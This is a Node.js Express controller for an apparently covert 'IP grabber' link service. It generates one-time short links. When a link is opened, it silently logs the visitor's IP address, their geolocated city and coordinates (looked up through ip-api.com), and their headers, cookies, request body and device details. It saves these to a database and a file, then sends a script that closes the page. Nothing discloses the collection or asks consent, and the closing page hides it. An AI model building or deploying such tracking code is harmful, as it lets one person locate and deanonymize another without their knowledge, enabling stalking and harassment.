const DeviceData = require('../models/DeviceData');
const Link = require('../models/Link');
const useragent = require('useragent');
const shortid = require('shortid');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
// const logger = require('../utils/logger.utils');
// const getFormattedTimestamp = require('../utils/formattedTimeStamp.utils');
// const { sendClosePageScript } = require('../utils/sendClosePageScript.utils');
const {
  getFormattedTimestamp,
  logger,
  sendClosePageScript,
} = require('../utils/index');

exports.generateLink = async (req, res) => {
  const shortUrl = shortid.generate();
  //const originalUrl = `http://localhost:3000/link/${shortUrl}`;
  const originalUrl = `https://link-refer.onrender.com/link/${shortUrl}`;

  const newLink = new Link({
    originalUrl,
    shortUrl,
    isActive: true,
    uniqueVisitorIds: [],
  });

  try {
    await newLink.save();
    logger.info(`Generated link: ${originalUrl}`);
    res.send(`Share this link: <a href="${originalUrl}">${originalUrl}</a>`);
  } catch (error) {
    logger.error('Error generating link:', error);
    res.status(500).send('Error generating link.');
  }
};

exports.processLink = async (req, res) => {
  const { shortUrl } = req.params;

  try {
    let link = await getLink(shortUrl);
    if (!link) return res.status(404).send('Link not found or is inactive.');

    const deviceData = await collectDeviceData(req, link._id);
    await saveDeviceData(deviceData, link);

    const fileName = await saveDeviceDataToFile(deviceData);
    sendClosePageScript(res);
    logger.info(`Processed link: ${shortUrl}, data saved to: ${fileName}`);
  } catch (error) {
    logger.error('Error processing link:', error);
    res.status(500).send('Error processing link.');
  }
};

async function getLink(shortUrl) {
  let link = await Link.findOne({ shortUrl });
  return link && link.isActive ? link : null;
}

async function collectDeviceData(req, linkId) {
  const ua = useragent.parse(req.headers['user-agent']);
  const uniqueVisitorId = shortid.generate();
  let ip = getIP(req);
  let locationData = await fetchLocationData(ip);

  return new DeviceData({
    ip,
    ips: req.ips,
    browser: ua.family || 'Unknown',
    os: ua.os.family || 'Unknown',
    device: ua.device?.family || 'Unknown',
    timestamp: new Date(),
    headers: req.headers,
    path: req.path,
    query: req.query,
    method: req.method,
    protocol: req.protocol,
    hostname: req.hostname,
    httpVersion: req.httpVersion,
    originalUrl: req.originalUrl,
    subdomains: req.subdomains,
    referrer: req.get('Referrer') || req.get('Referer') || 'Unknown',
    cookies: req.cookies || 'None',
    body: req.body || 'None',
    userId: req.user ? req.user.id : null,
    userAgent: req.headers['user-agent'],
    linkId,
    uniqueVisitorId,
    location: {
      country: locationData.country || 'Unknown',
      region: locationData.regionName || 'Unknown',
      city: locationData.city || 'Unknown',
      latitude: locationData.lat || 0,
      longitude: locationData.lon || 0,
    },
  });
}

function getIP(req) {
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  return ip === '::1' || ip === '127.0.0.1' ? '8.8.8.8' : ip;
}

async function fetchLocationData(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data;
  } catch (error) {
    logger.error('Error fetching location data:', error);
    return {};
  }
}

async function saveDeviceData(deviceData, link) {
  await deviceData.save();
  link.uniqueVisitorIds.push(deviceData.uniqueVisitorId);
  link.isActive = false;
  await link.save();
}

async function saveDeviceDataToFile(deviceData) {
  const timestamp = getFormattedTimestamp();
  const fileName = `deviceData_${timestamp}.json`;
  const filePath = path.join(__dirname, '..', 'data', fileName);

  return new Promise((resolve, reject) => {
    fs.writeFile(
      filePath,
      JSON.stringify(deviceData.toObject(), null, 2),
      (error) => {
        if (error) {
          logger.error('Error writing to JSON file:', error);
          reject(error);
        } else {
          resolve(fileName);
        }
      }
    );
  });
}
